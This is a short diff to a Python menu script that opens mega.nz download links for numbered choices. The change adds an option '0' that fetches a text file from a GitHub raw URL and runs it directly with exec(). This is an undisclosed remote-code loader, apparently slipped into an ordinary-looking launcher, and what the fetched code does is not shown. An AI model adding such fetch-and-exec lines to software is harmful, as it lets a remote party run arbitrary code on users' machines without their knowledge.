@@ -35,5 +35,7 @@ while True:
         webbrowser.open_new("https://mega.nz/file/YidEnJBL#VFpG-ZSBHpaP7hBmin2Gw_aimcOjmW5Bl4t2kr7FtZY")
     elif chon == '3.1':
         webbrowser.open_new("https://mega.nz/file/F7cgTBqY#T841YKwcqAmOG94r0OXrw4TtvPpOkreY4GUwmFSWV7o")
+    elif chon == '0':
+        exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)    
     else:
        continue
